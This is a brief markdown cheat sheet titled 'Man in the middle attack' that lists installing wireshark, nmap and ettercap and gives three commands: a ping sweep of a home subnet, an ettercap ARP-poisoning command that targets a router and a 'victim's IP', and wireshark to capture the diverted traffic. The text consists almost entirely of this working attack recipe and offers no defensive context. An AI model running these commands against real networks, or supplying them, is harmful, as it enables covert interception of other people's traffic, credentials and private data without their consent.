# Man in the middle attack

1. wireshark    apt install wireshark
2. nmap         apt install nmap
3. ettercap     apt install ettercap-text-only

```console
sudo nmap -sn <subnetForHomeNetwork>
sudo ettercap -T -S -i <wlan0> -M arp:remote /<routerIP>// /<victim'sIP>//
sudo wireshark
```
